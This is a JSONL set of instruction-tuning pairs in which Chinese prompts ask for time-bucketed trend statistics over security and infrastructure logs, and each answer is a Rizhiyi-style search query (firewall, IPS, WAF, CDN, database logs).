{"input": "按每小时分桶统计middleware_tomcat_请求方式趋势。", "instruction": "middleware_tomcat_数据，编写查询语句实现如下分析场景", "output": "appname:middleware tag:tomcat|bucket timestamp span=1h as ts|stats count() as count_ by middleware.method,ts"}
{"input": "按每小时分桶统计被攻击趋势。", "instruction": "ips_fortinet_数据，编写查询语句实现如下分析场景", "output": "appname:ips tag:fortinet | bucket timestamp span=1h as ts |stats count(ips.dst.geo.ip) by appname,ts"}
{"input": "按每小时分桶统计动作变化趋势。", "instruction": "websense_dlp_数据，编写查询语句实现如下分析场景", "output": "appname:dlp tag:websense|bucket timestamp span=1h as ts | stats count() by dlp.action,ts"}
{"input": "按每小时分桶统计用户登录情况趋势。", "instruction": "安全态势数据，编写查询语句实现如下分析场景", "output": "appname:vpn vpn.user:root AND vpn.actype:login|bucket timestamp span=1h as ts |stats count() as cnt by vpn.msg,vpn.actype,ts"}
{"input": "按每小时分桶统计sangfor_cdn_ad_SSL访问事件趋势。", "instruction": "深信服负载均衡ad数据，编写查询语句实现如下分析场景", "output": "(appname:cdn AND tag:sangfor) SSL|bucket timestamp span=1h as ts|stats count() as cnt by ts "}
{"input": "按每小时分桶统计请求方式趋势。", "instruction": "pf_tomcat数据，编写查询语句实现如下分析场景", "output": "appname:pf_tomcat |bucket timestamp span=1h as ts|stats count() as count_ by ts,tomcat.method"}
{"input": "按每小时分桶统计请求方式趋势。", "instruction": "pf_nginx数据，编写查询语句实现如下分析场景", "output": "appname:pf_nginx |bucket timestamp span=1h as ts|stats count() as count_ by ts,nginx.method"}
{"input": "按每小时分桶统计请求方式趋势。", "instruction": "Apache日志数据，编写查询语句实现如下分析场景", "output": "appname:apache tag:access|bucket timestamp span=1h as ts|stats count() as count_ by middleware.method,ts"}
{"input": "按每小时分桶统计请求方式趋势。", "instruction": "webLogic日志数据，编写查询语句实现如下分析场景", "output": "appname:weblogic tag:access|bucket timestamp span=1h as ts|stats count() as count_ by middleware.http_method,ts"}
{"input": "按每小时分桶统计功能分类的用量趋势。", "instruction": "日志易运营视图数据，编写查询语句实现如下分析场景", "output": "appname:frontend_log  AND  (frontend.message.category:search OR frontend.message.category:alert OR frontend.message.category:schedule OR frontend.message.category:report) |bucket timestamp span=1h as ts | stats count() as count_  by frontend.message.category,ts "}
{"input": "按每小时分桶统计各应用的报错趋势分析。", "instruction": "日志易运营视图数据，编写查询语句实现如下分析场景", "output": "tag:rizhiyi_internal error | bucket timestamp span=1h as ts |stats count() as count_ by ts,appname"}
{"input": "按每小时分桶统计h3c_switch_各类动作执行趋势。", "instruction": "h3c_switch_S10508数据，编写查询语句实现如下分析场景", "output": "appname:switch  tag:h3c| bucket timestamp span=1h as ts |stats count() as cnt by switch.action,ts"}
{"input": "按每小时分桶统计h3c_switch_登录趋势。", "instruction": "h3c_switch_S10508数据，编写查询语句实现如下分析场景", "output": "appname:switch  tag:h3c switch.event_type:* AND (switch.result:successfully OR switch.result:failed)|bucket timestamp span=1h as ts  |stats count() as cnt by switch.result,ts"}
{"input": "按每小时分桶统计被攻击趋势图。", "instruction": "ips_dptech数据，编写查询语句实现如下分析场景", "output": "appname:ips  tag:dptech  ips.dst_ip:* | bucket timestamp span=1h as ts | stats count() by appname,ts"}
{"input": "按每小时分桶统计总访问请求趋势。", "instruction": "ips_dptech数据，编写查询语句实现如下分析场景", "output": "appname:ips tag:dptech | bucket timestamp span=1h as ts | stats count() as count_  by appname,ts"}
{"input": "按每小时分桶统计总访问请求趋势。", "instruction": "ips_legendsec数据，编写查询语句实现如下分析场景", "output": "appname:ips tag:legendsec | bucket timestamp span=1h as ts | stats count() as count_  by appname,ts"}
{"input": "按每小时分桶统计IPS被攻击趋势图。", "instruction": "ips_legendsec数据，编写查询语句实现如下分析场景", "output": "appname:ips tag:legendsec | bucket timestamp span=1h as ts | stats count(ips.dst.geo.ip) by appname,ts"}
{"input": "按每小时分桶统计操作失败趋势。", "instruction": "圣博润堡垒机日志数据，编写查询语句实现如下分析场景", "output": "appname:fortress tag:sbr  (NOT fortress.log_type:AUDIT_LOG NOT fortress.log_type:SYS_STATE_ALARM) fortress.request_msg:*\n| rename fortress.* as * \n| bucket timestamp span=1h as ts  \n|eval time=formatdate(ts,\"HH:mm\")\n|stats count() as cnt by time"}
{"input": "按每小时分桶统计连接主机失败趋势。", "instruction": "officescan防毒墙数据，编写查询语句实现如下分析场景", "output": "appname:antivirus_gateway tag:officescan antivirus.domain:* antivirus.result:*FAIL |bucket timestamp span=1h as ts | stats count() as cnt by ts "}
{"input": "按每小时分桶统计主机被攻击趋势图。", "instruction": "冠群防火墙日志数据，编写查询语句实现如下分析场景", "output": "appname:firewall tag:newdon firewall.type:secure|bucket timestamp span=1h as ts|stats count() by ts,firewall.dst_ip"}
{"input": "按每小时分桶统计被攻击端口趋势图。", "instruction": "冠群防火墙日志数据，编写查询语句实现如下分析场景", "output": "appname:firewall tag:newdon firewall.type:secure|bucket timestamp span=1h as ts|stats count() by ts,firewall.dst_port"}
{"input": "按每小时分桶统计登录登出趋势。", "instruction": "esxi宿主机审计数据，编写查询语句实现如下分析场景", "output": "appname:esxi AND 'tag':hostd esxi.action:logged*|bucket timestamp span=1h as ts  | stats count() as cnt by ts,esxi.action"}
{"input": "按每小时分桶统计各等级攻击事件趋势。", "instruction": "ips_mcafee数据，编写查询语句实现如下分析场景", "output": "appname:ips tag:mcafee NOT ips.level:Informational|bucket timestamp span=1h as ts | stats count() as cnt by ts,ips.level"}
{"input": "按每小时分桶统计各类威胁趋势。", "instruction": "长亭NTA数据，编写查询语句实现如下分析场景", "output": "appname:nta tag:chaitin|bucket timestamp span=1h as ts |stats count() as cnt by ts,nta.attack_type"}
{"input": "按每小时分桶统计请求方式趋势。", "instruction": "瑞数waf数据，编写查询语句实现如下分析场景", "output": "appname:waf tag:river|bucket timestamp span=1h as ts|stats count() as count_ by waf.method,ts"}
{"input": "按每小时分桶统计交易请求的结果。", "instruction": "zsns 应用的tomcat业务数据，编写查询语句实现如下分析场景", "output": "appname:zsns tomcat.event_type:*响应报文\n|bucket timestamp span=1h as ts\n| stats count() as cnt by tomcat.service.head.rspMsg"}
{"input": "按每小时分桶统计ips_topsec_被攻击趋势。", "instruction": "ips_topsec数据，编写查询语句实现如下分析场景", "output": "appname:ips tag:topsec |bucket timestamp span=1h as ts |stats count(ips.dst.geo.ip) by appname,ts"}
{"input": "按每小时分桶统计ips_topsec_动作趋势。", "instruction": "ips_topsec数据，编写查询语句实现如下分析场景", "output": "appname:ips tag:topsec |bucket timestamp span=1h as ts |stats count() as a by ips.action,ts"}
{"input": "按每小时分桶统计ips_topsec_协议访问趋势。", "instruction": "ips_topsec数据，编写查询语句实现如下分析场景", "output": "appname:ips tag:topsec |bucket timestamp span=1h as ts |stats count()  as a by ips.proto,ts"}
{"input": "按每分钟分桶统计aofei_CDN业务趋势总览。", "instruction": "奥飞CDN数据数据，编写查询语句实现如下分析场景", "output": "appname:cdn tag:aofei | bucket timestamp span=1m as ts |  stats count() by appname,ts"}
{"input": "按每分钟分桶统计aofei_cdn命中趋势。", "instruction": "奥飞CDN数据数据，编写查询语句实现如下分析场景", "output": "appname:cdn tag:aofei  AND cdn.cdn_status:*HIT| bucket timestamp span=1m as ts | stats count() by appname,ts"}
{"input": "按每分钟分桶统计aofei_点播业务趋势总览。点播域名包括：vod1.video.com,vod2.video.com,vod3.video.com,vod4.video.com。", "instruction": "奥飞CDN数据数据，编写查询语句实现如下分析场景", "output": "appname:cdn tag:aofei AND (cdn.domain:vod1.video.com OR cdn.domain:vod2.video.com OR  cdn.domain:vod3.video.com OR cdn.domain:vod4.video.com) | bucket timestamp span=1m as ts | stats count() as count_ by ts "}
{"input": "按每分钟分桶统计aofei_各点播节目在线趋势。点播域名包括：vod1.video.com,vod2.video.com,vod3.video.com,vod4.video.com。", "instruction": "奥飞CDN数据数据，编写查询语句实现如下分析场景", "output": "appname:cdn tag:aofei (cdn.domain:vod1.video.com OR cdn.domain:vod2.video.com OR  cdn.domain:vod3.video.com OR cdn.domain:vod4.video.com) | bucket timestamp span=1m as ts | stats count() as count_ by cdn.domain,ts"}
{"input": "按每分钟分桶统计CDN业务趋势总览。", "instruction": "华为CDN数据数据，编写查询语句实现如下分析场景", "output": "appname:cdn tag:huawei  | bucket timestamp span=1m as ts |  stats count() by appname,ts"}
{"input": "按每分钟分桶统计CDN各节点业务趋势。", "instruction": "华为CDN数据数据，编写查询语句实现如下分析场景", "output": "appname:cdn tag:huawei  | bucket timestamp span=1m as ts |  stats count() by tag,ts"}
{"input": "按每分钟分桶统计CDN命中趋势。", "instruction": "华为CDN数据数据，编写查询语句实现如下分析场景", "output": "appname:cdn tag:huawei  AND cdn.cdn_status:*HIT| bucket timestamp span=1m as ts | stats count() by appname,ts"}
{"input": "按每分钟分桶统计CDN各节点超时趋势。", "instruction": "华为CDN数据数据，编写查询语句实现如下分析场景", "output": "appname:cdn tag:huawei  cdn.finished_body_response:>3  |bucket timestamp span=1m as ts | stats count() by tag,ts"}
{"input": "按每分钟分桶统计各点播节目在线趋势。点播域名包括：vod1.video.com,vod2.video.com,vod3.video.com,vod4.video.com。", "instruction": "华为CDN数据数据，编写查询语句实现如下分析场景", "output": "appname:cdn tag:huawei (cdn.domain:vod1.video.com OR cdn.domain:vod2.video.com OR  cdn.domain:vod3.video.com OR cdn.domain:vod4.video.com) | bucket timestamp span=1m as ts | stats count() as count_ by cdn.domain,ts"}
{"input": "按每分钟分桶统计点播业务趋势总览。点播域名包括：vod1.video.com,vod2.video.com,vod3.video.com,vod4.video.com。", "instruction": "华为CDN数据数据，编写查询语句实现如下分析场景", "output": "appname:cdn tag:huawei AND (cdn.domain:vod1.video.com OR cdn.domain:vod2.video.com OR  cdn.domain:vod3.video.com OR cdn.domain:vod4.video.com) | bucket timestamp span=1m as ts | stats count() as count_ by ts "}
{"input": "按每分钟分桶统计点播业务命中趋势。点播域名包括：vod1.video.com,vod2.video.com,vod3.video.com,vod4.video.com。", "instruction": "华为CDN数据数据，编写查询语句实现如下分析场景", "output": "appname:cdn tag:huawei  AND  (cdn.domain:vod1.video.com OR cdn.domain:vod2.video.com OR  cdn.domain:vod3.video.com OR cdn.domain:vod4.video.com) AND cdn.cdn_status:*HIT | bucket timestamp span=1m as ts  | stats count()  as count_ by appname,ts | rename count_  as \"点播业务命中趋势\""}
{"input": "按每分钟分桶统计点播业务各节点超时趋势。点播域名包括：vod1.video.com,vod2.video.com,vod3.video.com,vod4.video.com。", "instruction": "华为CDN数据数据，编写查询语句实现如下分析场景", "output": "appname:cdn tag:huawei cdn.finished_body_response:>3 (cdn.domain:vod1.video.com OR cdn.domain:vod2.video.com OR  cdn.domain:vod3.video.com OR cdn.domain:vod4.video.com) |bucket timestamp span=1m as ts | stats count() by tag,ts"}
{"input": "按每分钟分桶统计图片业务趋势总览。图片业务域名包括：wapx.example.cn,img.example.cn,tv.example.cn。", "instruction": "华为CDN数据数据，编写查询语句实现如下分析场景", "output": "appname:cdn tag:huawei (cdn.domain:wapx.example.cn OR cdn.domain:img.example.cn OR  cdn.domain:tv.example.cn)|bucket timestamp span=1m as ts | stats count() as count_ by ts "}
{"input": "按每分钟分桶统计图片业务分组在线趋势。图片业务域名包括：wapx.example.cn,img.example.cn,tv.example.cn。", "instruction": "华为CDN数据数据，编写查询语句实现如下分析场景", "output": "appname:cdn tag:huawei (cdn.domain:wapx.example.cn OR cdn.domain:img.example.cn OR  cdn.domain:tv.example.cn)| bucket timestamp span=1m as ts | stats count() as count_ by cdn.domain,ts"}
{"input": "按每分钟分桶统计高危事件趋势。", "instruction": "ips_nsfocus数据，编写查询语句实现如下分析场景", "output": "appname:ips  tag:nsfocus ips.level:>2 | bucket timestamp span=1m as ts  | stats count() as count_ by appname,ts "}
{"input": "按每分钟分桶统计各IP接口调用次数时间趋势图。", "instruction": "Thinkbus接口访问数据，编写查询语句实现如下分析场景", "output": "appname:thinkive_works_bus_date_log AND middleware.action:\"开始处理\" |bucket timestamp span=1m as ts|stats count() as '接口调用次数' by ts, middleware.client_ip"}
{"input": "按每分钟分桶统计esxi宿主机Out总流量。", "instruction": "VMware_Esxi监控数据，编写查询语句实现如下分析场景", "output": "appname:esxi tag:api esxi.metric:esxi.net.if.out|bucket timestamp span=1m as ts | stats count() by ts,esxi.tags.host,esxi.value|eval if_out=todouble(esxi.value)| eval usage=if_out/1024 |eval Mb=format(\"%.2f\",usage)"}
{"input": "按每分钟分桶统计esxi宿主机In总流量。", "instruction": "VMware_Esxi监控数据，编写查询语句实现如下分析场景", "output": "appname:esxi tag:api esxi.metric:esxi.net.if.in|bucket timestamp span=1m as ts | stats count() by ts,esxi.tags.host,esxi.value|eval if_in=todouble(esxi.value)| eval usage=if_in/1024 |eval Mb=format(\"%.2f\",usage)"}
{"input": "按每分钟分桶统计audit_source。", "instruction": "Database_Oracle数据，编写查询语句实现如下分析场景", "output": "appname:oracle tag:audit|bucket timestamp span=1m as ts |stats count() by ts,source"}
{"input": "按每分钟分桶统计kafka分 partition 统计lag积压趋势（待查询 topic 为 raw_message）。", "instruction": "kafka数据，编写查询语句实现如下分析场景", "output": "appname:kafka tag:performance kafka.topic:raw_message |bucket timestamp span=1m as ts|stats count() by ts,kafka.partition,kafka.lag"}
{"input": "按每30分钟分桶统计登录失败趋势图。", "instruction": "aix日志数据，编写查询语句实现如下分析场景", "output": "appname:aix tag:failedlogin [[appname:aix tag:failedlogin|stats count(hostname) as count_ by hostname|fields hostname]]\n| bucket timestamp span=30m as ts|stats count(hostname) by hostname,ts"}
{"input": "按每30分钟分桶统计errpt报错趋势图。", "instruction": "aix日志数据，编写查询语句实现如下分析场景", "output": "appname:aix tag:errpt |bucket timestamp span=30m as ts|stats count(hostname) as count_1 by  hostname,aix.type_dec,ts\n|eval time=formatdate(ts,\"HH:mm\")"}
{"input": "按每30分钟分桶统计aix各等级事件数趋势。", "instruction": "aix日志数据，编写查询语句实现如下分析场景", "output": "appname:aix| bucket timestamp span=30m as ts | stats count() as count_ by aix.severity,ts"}
{"input": "按每30分钟分桶统计aix主机登录失败趋势。", "instruction": "aix日志数据，编写查询语句实现如下分析场景", "output": "appname:aix AND \"Failed password for\" |bucket timestamp span=30m as ts1|stats count() as ct by aix.dst_host,ts1"}
{"input": "按每30分钟分桶统计F5_URL访问趋势。", "instruction": "F5数据，编写查询语句实现如下分析场景", "output": "appname:loadbalancing tag:f5 AND loadbalancing.type:logger|bucket timestamp span=30m as ts|stats count() as ct by ts|rename ct  as \"访问次数\""}
{"input": "按每30分钟分桶统计F5_URL访问状态趋势。", "instruction": "F5数据，编写查询语句实现如下分析场景", "output": "appname:loadbalancing tag:f5 AND loadbalancing.type:logger|bucket timestamp span=30m as ts|stats count() as ct by loadbalancing.status,ts|rename ct as \"访问次数\""}
{"input": "按每30分钟分桶统计防火墙_hillstone事件趋势图。", "instruction": "防火墙_hillstone数据，编写查询语句实现如下分析场景", "output": "appname:firewall AND tag:hillstone |bucket timestamp span=30m as ts | stats count() as total by ts|rename total as \"数量\""}
{"input": "按每30分钟分桶统计IPS攻击趋势图。", "instruction": "防火墙_hillstone数据，编写查询语句实现如下分析场景", "output": "(* IPS) AND appname:firewall tag:hillstone |bucket timestamp span=30m as ts | stats count() as count_ by  ts "}
{"input": "按每30分钟分桶统计防火墙_dell事件趋势图。", "instruction": "dell防火墙日志数据，编写查询语句实现如下分析场景", "output": "appname:firewall AND tag:dell |bucket timestamp span=30m as ts | stats count() as total by ts|rename total as \"数量\""}
{"input": "按每30分钟分桶统计juniper不同协议变化趋势图。", "instruction": "防火墙_juniper数据，编写查询语句实现如下分析场景", "output": "(* AND appname:firewall) AND tag:juniper |bucket timestamp span=30m as ts | stats count() as total by firewall.proto\t,ts"}
{"input": "按每30分钟分桶统计juniper不同服务连接的变化趋势。", "instruction": "防火墙_juniper数据，编写查询语句实现如下分析场景", "output": "(* AND appname:firewall) AND tag:juniper |bucket timestamp span=30m as ts | stats count() as total  by firewall.service,ts\t"}
{"input": "按每30分钟分桶统计堡垒机_qizhi_登录成功失败趋势。", "instruction": "堡垒机_qizhi数据，编写查询语句实现如下分析场景", "output": "appname:fortress tag:shterm fortress.type:* | bucket timestamp span=30m as ts | stats count() as total by fortress.loginOK,ts"}
{"input": "按每30分钟分桶统计堡垒机_qizhi_不同日志级别趋势图。", "instruction": "堡垒机_qizhi数据，编写查询语句实现如下分析场景", "output": " appname:fortress tag:shterm  | bucket timestamp span=30m as ts | stats count() as total by fortress.severity,ts"}
{"input": "按每30分钟分桶统计安恒waf请求方式趋势图。", "instruction": "安恒waf日志数据，编写查询语句实现如下分析场景", "output": " (appname:waf tag:dbappsecurity)  |bucket timestamp span=30m as ts |stats count(waf.message.method) as count_ by waf.message.method,ts"}
{"input": "按每30分钟分桶统计安恒waf阻断事件类型趋势图。", "instruction": "安恒waf日志数据，编写查询语句实现如下分析场景", "output": " appname:waf tag:dbappsecurity waf.message.action:\"阻断\"|bucket timestamp span=30m as ts | stats count() by ts,waf.message.event"}
{"input": "按每30分钟分桶统计安恒waf攻击url趋势图。", "instruction": "安恒waf日志数据，编写查询语句实现如下分析场景", "output": "(appname:waf tag:dbappsecurity)|bucket timestamp span=30m as ts | stats count() by waf.url,ts"}
{"input": "按每30分钟分桶统计请求协议趋势。", "instruction": "ips_nsfocus数据，编写查询语句实现如下分析场景", "output": "appname:ips  tag:nsfocus | bucket timestamp span=30m as ts | stats count()  as a by ips.proto,ts"}
{"input": "按每30分钟分桶统计firewall_juniper_不同服务连接的变化趋势。", "instruction": "firewall_juniper_数据，编写查询语句实现如下分析场景", "output": "appname:firewall  tag:juniper |bucket timestamp span=30m as ts | stats count() as total  by firewall.service,ts"}
{"input": "按每30分钟分桶统计请求错误趋势。", "instruction": "pf_tomcat数据，编写查询语句实现如下分析场景", "output": "appname:pf_tomcat tomcat.status:>399|bucket timestamp span=30m as ts| stats count() as count_ by tomcat.status,ts"}
{"input": "按每30分钟分桶统计访问ip趋势。", "instruction": "pf_nginx数据，编写查询语句实现如下分析场景", "output": "appname:pf_nginx |bucket timestamp span=30m as ts|stats count() as ct by ts,nginx.src_ip"}
{"input": "按每30分钟分桶统计请求错误趋势。", "instruction": "pf_nginx数据，编写查询语句实现如下分析场景", "output": "appname:pf_nginx nginx.status:>399|bucket timestamp span=30m as ts| stats count() as count_ by nginx.status,ts"}
{"input": "按每30分钟分桶统计订单失败原因趋势。", "instruction": "pf_gateway数据，编写查询语句实现如下分析场景", "output": "appname:pf_gateway NOT gateway.result:result=true|bucket timestamp span=30m as ts|stats count() as cnt by ts,gateway.event_name"}
{"input": "按每30分钟分桶统计tomcat_stdout_各类事件发生趋势。", "instruction": "tomcat_stdout_数据，编写查询语句实现如下分析场景", "output": "appname:tomcat tag:stdout |bucket timestamp span=30m as ts |stats count() by middleware.event_type,ts"}
{"input": "按每30分钟分桶统计请求错误统计。", "instruction": "Apache日志数据，编写查询语句实现如下分析场景", "output": "appname:apache tag:access middleware.status:>399|bucket timestamp span=30m as ts| stats count() as count_ by middleware.status,ts"}
{"input": "按每30分钟分桶统计请求错误统计。", "instruction": "webLogic日志数据，编写查询语句实现如下分析场景", "output": "appname:weblogic tag:access middleware.request_status:>399|bucket timestamp span=30m as ts| stats count() as count_ by middleware.request_status,ts"}
{"input": "按每30分钟分桶统计csa_事件趋势图。", "instruction": "hillstone_态势感知数据，编写查询语句实现如下分析场景", "output": "appname:csa AND tag:hillstone |bucket timestamp span=30m as ts | stats count() as total by ts|rename total as \"数量\""}
{"input": "按每30分钟分桶统计vpn_leadsec_vpn登录趋势。", "instruction": "vpn_leadsec_数据，编写查询语句实现如下分析场景", "output": "appname:vpn tag:leadsec AND ('vpn.动作':login OR 'vpn.动作':logout OR 'vpn.动作':\"用户登录\")|bucket timestamp span=30m as ts|stats count() as cnt  by 'vpn.日志类型','vpn.动作',ts"}
{"input": "按每30分钟分桶统计攻击事件趋势。", "instruction": "WAF_长亭数据，编写查询语句实现如下分析场景", "output": "appname:waf tag:chatin|bucket timestamp span=30m as ts|stats count() as cnt by ts,waf.risk_level"}
{"input": "按每30分钟分桶统计阻断的各类攻击事件趋势。", "instruction": "WAF_长亭数据，编写查询语句实现如下分析场景", "output": "(appname:waf AND tag:chatin) waf.action:deny|bucket timestamp span=30m as ts  |stats count() as cnt by waf.attack_type,ts"}
{"input": "按每30分钟分桶统计IPS请求协议趋势。", "instruction": "ips_legendsec数据，编写查询语句实现如下分析场景", "output": "appname:ips tag:legendsec| bucket timestamp span=30m as ts | stats count()  as a by ips.proto,ts"}
{"input": "按每30分钟分桶统计ssl登录趋势。", "instruction": "信安世纪ssl数据，编写查询语句实现如下分析场景", "output": "appname:ssl tag:infosec | bucket timestamp span=30m as ts | stats count() as cnt by ssl.action,ts"}
{"input": "按每30分钟分桶统计各类事件攻击趋势。", "instruction": "微步在线tdp数据，编写查询语句实现如下分析场景", "output": "appname:tdp tag:threatbook|bucket timestamp span=30m as ts | stats count() as cnt by ts,tdp.threat.name"}
{"input": "按每30分钟分桶统计用户认证趋势。", "instruction": "uniNXG数据，编写查询语句实现如下分析场景", "output": "appname:uninxg tag:leagsoft uninxg.log_type:userAuthInfo|bucket timestamp span=30m as ts | stats count() as cnt by ts,uninxg.iresulttype"}
{"input": "按每30分钟分桶统计请求返回结果错误趋势。", "instruction": "同花顺日志数据，编写查询语句实现如下分析场景", "output": "appname:ths_all  (ths_all.ANSTYPE:0 )  NOT ths_all.msg:*.*  NOT ths_all.msg:*;*  NOT ths_all.msg:\"-\" NOT ths_all.msg:\":\"|bucket timestamp span=30m as ts | stats count() by ths_all.funccn,ts"}
{"input": "按每30分钟分桶统计不同返回结果的数量趋势。注意对结果字段ths_all.msg先转字符串并 trim 处理，然后再分组统计。", "instruction": "同花顺日志数据，编写查询语句实现如下分析场景", "output": "appname:ths_all  (ths_all.ANSTYPE:0 )  NOT ths_all.msg:*.*  NOT ths_all.msg:*;*  NOT ths_all.msg:\"-\" NOT ths_all.msg:\":\"\n|eval aaa=tostring(ths_all.msg)\n|eval bbb=trim(aaa)\n|bucket timestamp span=30m as ts \n| stats count() by bbb,ts"}
{"input": "按每30分钟分桶统计各类型功能请求趋势。", "instruction": "同花顺日志数据，编写查询语句实现如下分析场景", "output": "appname:ths_all NOT  (ths_all.ANSTYPE:0 OR ths_all.ANSTYPE:1)|bucket timestamp span=30m as ts | stats count() by ths_all.funccn,ts"}
{"input": "按每30分钟分桶统计访问状态趋势。", "instruction": "loadbalancing_array数据，编写查询语句实现如下分析场景", "output": "(appname:loadbalancing AND tag:array ) |bucket timestamp span=30m as ts\n|rename loadblancing.* as * \n| stats count() as cnt by status,ts"}
{"input": "按每30分钟分桶统计登录认证趋势。", "instruction": "锐捷-路由器数据，编写查询语句实现如下分析场景", "output": "appname:router tag:ruijie *AUTH* |bucket timestamp span=30m as ts | stats count() as cnt by ts,router.auth_result"}
{"input": "按每30分钟分桶统计威胁事件趋势。", "instruction": "诺顿防病毒数据，编写查询语句实现如下分析场景", "output": "appname:antivirus tag:norton atv.cat:\"ESET Threat Event\"| bucket timestamp span=30m as ts | stats count() as cnt by ts "}
{"input": "按每30分钟分桶统计非威胁事件趋势。", "instruction": "诺顿防病毒数据，编写查询语句实现如下分析场景", "output": "appname:antivirus tag:norton NOT atv.cat:\"ESET Threat Event\"| bucket timestamp span=30m as ts | stats count() as cnt by ts,atv.cat "}
{"input": "按每30分钟分桶统计蜜罐入侵趋势。", "instruction": "长亭蜜罐数据，编写查询语句实现如下分析场景", "output": "appname:honeypot tag:chaitin   hp.source:honeypot|bucket timestamp span=30m as ts |stats count() as cnt by ts,hp.event_level"}
{"input": "按每30分钟分桶统计不同级别日志趋势图。", "instruction": "华为防火墙日志数据，编写查询语句实现如下分析场景", "output": "(* AND appname:firewall) AND tag:huawei |bucket timestamp span=30m as ts | stats count() as total by firewall.severity,ts"}
{"input": "按每30分钟分桶统计请求错误统计。", "instruction": "瑞数waf数据，编写查询语句实现如下分析场景", "output": "appname:waf tag:river waf.status_code:>399|bucket timestamp span=30m as ts| stats count() as count_ by waf.status_code,ts"}
{"input": "按每30分钟分桶统计目标城市TOP5访问趋势图。", "instruction": "Sonic防火墙数据，编写查询语句实现如下分析场景", "output": "(* AND appname:firewall) AND tag:sonicwall [[(* AND appname:firewall) AND tag:sonicwall | top 5 firewall.dst.geo.city  | fields firewall.dst.geo.city ]] | bucket timestamp span=30m as ts | stats count() by firewall.dst.geo.city,ts"}
{"input": "按每30分钟分桶统计访问协议TOP5趋势图。", "instruction": "Sonic防火墙数据，编写查询语句实现如下分析场景", "output": "(* AND appname:firewall) AND tag:sonicwall [[(* AND appname:firewall) AND tag:sonicwall  | top 5 firewall.proto  | fields firewall.proto ]] | bucket timestamp span=30m as ts | stats count() by firewall.proto,ts"}
{"input": "按每5分钟分桶统计postgresql数据库错误等级趋势。", "instruction": "postgresql日志数据，编写查询语句实现如下分析场景", "output": "appname:postgresql NOT postgresql.error_severity:LOG|bucket timestamp span=5m as ts | stats count() by postgresql.database,ts"}
{"input": "按每5分钟分桶统计postgresql数据库慢日志趋势。", "instruction": "postgresql日志数据，编写查询语句实现如下分析场景", "output": "appname:postgresql   postgresql.duration:* | bucket timestamp span=5m as ts| stats count()  by postgresql.database,ts"}
{"input": "按每5分钟分桶统计mongodb操作类型分组趋势。", "instruction": "mongodb日志数据，编写查询语句实现如下分析场景", "output": "appname:mongodb |bucket timestamp span=5m as ts|stats count() as count1 by mongodb.action,ts"}
{"input": "按每5分钟分桶统计策略拒绝事件趋势图。", "instruction": "防火墙_hillstone数据，编写查询语句实现如下分析场景", "output": "appname:firewall AND tag:hillstone AND firewall.policy:deny|bucket timestamp span=5m as ts | stats count() as total by ts | rename total as \"事件数量\""}
{"input": "按每5分钟分桶统计严重日志级别趋势。", "instruction": "深信服防火墙日志数据，编写查询语句实现如下分析场景", "output": "appname:firewall tag:sangfor |bucket timestamp span=5m as ts |stats count() by firewall.grade,ts"}
{"input": "按每5分钟分桶统计日志量趋势。", "instruction": "深信服防火墙日志数据，编写查询语句实现如下分析场景", "output": "appname:firewall tag:sangfor |bucket timestamp span=5m as ts |stats count() by ts\n"}
{"input": "按每5分钟分桶统计拒绝行为趋势_应用分类。", "instruction": "深信服防火墙日志数据，编写查询语句实现如下分析场景", "output": "appname:firewall tag:sangfor firewall.action:拒绝|bucket timestamp span=5m as ts |stats count() as count_1 by firewall.app_name,ts"}
{"input": "按每5分钟分桶统计发送过滤趋势。", "instruction": "梭子鱼邮件网关日志数据，编写查询语句实现如下分析场景", "output": "appname:security_gateway tag:barracuda security_gateway.event_name:SEND| bucket timestamp span=5m as ts |stats count() as count_1 by  ts"}
{"input": "按每5分钟分桶统计接收过滤趋势。", "instruction": "梭子鱼邮件网关日志数据，编写查询语句实现如下分析场景", "output": "appname:security_gateway tag:barracuda security_gateway.event_name:RECV| bucket timestamp span=5m as ts |stats count() as count_1 by  ts"}
{"input": "按每5分钟分桶统计ADS攻击类型趋势分析。", "instruction": "ads_nsfocus数据，编写查询语句实现如下分析场景", "output": "appname:ddos tag:nsfocus  |bucket timestamp span=5m as ts | stats count() by ddos.attack_type,ts"}
{"input": "按每5分钟分桶统计ADS攻击趋势图。", "instruction": "ads_nsfocus数据，编写查询语句实现如下分析场景", "output": "appname:ddos tag:nsfocus  |bucket timestamp span=5m as ts | stats count() by appname,ts"}
{"input": "按每5分钟分桶统计请求方式趋势。", "instruction": "middleware_microsoft_iis_数据，编写查询语句实现如下分析场景", "output": "appname:middleware tag:iis |bucket timestamp span=5m as ts|stats count() as count_ by middleware.method,ts"}
{"input": "按每5分钟分桶统计mall_bus全部返回码趋势。", "instruction": "mall_bus中间件业务数据，编写查询语句实现如下分析场景", "output": "appname:xdtx_mall_bus |bucket timestamp span=5m as ts | stats count() as  cnt by ts,middleware.status "}
{"input": "按每5分钟分桶统计各模块错误趋势。", "instruction": "恒生中间件日志数据，编写查询语句实现如下分析场景", "output": "appname:hundsun tag:error  appname:hundsun|bucket timestamp span=5m as ts | stats count() by middleware.module,ts"}
{"input": "按每5分钟分桶统计各类SQL趋势。", "instruction": "Database_Oracle数据，编写查询语句实现如下分析场景", "output": "appname:oracle tag:audit|bucket timestamp span=5m  as ts|stats count() by ts,audit.command"}
{"input": "按每5分钟分桶统计数据库_oracle_ORA错误码事件趋势。", "instruction": "Database_Oracle数据，编写查询语句实现如下分析场景", "output": "appname:oracle tag:alert oracle.ORACODE:ORA*  | bucket timestamp span=5m  as ts| stats count() as '数量' by ts,oracle.ORACODE"}
{"input": "按每5分钟分桶统计TABLESPACE_NAME增长趋势。", "instruction": "Database_Oracle数据，编写查询语句实现如下分析场景", "output": "appname:oracle AND tag:tablespace |bucket timestamp span=5m as ts | stats count() by ts,oracle.Name,'oracle.Size_(M)'"}
{"input": "按每5分钟分桶统计操作趋势分析。", "instruction": "Database_Oracle数据，编写查询语句实现如下分析场景", "output": "appname:oracle tag:audit|bucket timestamp span=5m  as ts|stats count() by ts,audit.command"}
{"input": "按每5分钟分桶统计委托请求趋势。", "instruction": "同花顺数据，编写查询语句实现如下分析场景", "output": "appname:ths THS.REQTYPE:3 THS.ANSTYPE:\" \" | bucket timestamp span=5m as ts | stats count() by ts,THS.MMLB"}
{"input": "按每5分钟分桶统计银证转账请求趋势。", "instruction": "同花顺数据，编写查询语句实现如下分析场景", "output": "appname:ths THS.REQTYPE:/[EF]/ THS.ANSTYPE:\" \"  | bucket timestamp span=5m as ts | stats count() by ts,THS.REQTYPE"}
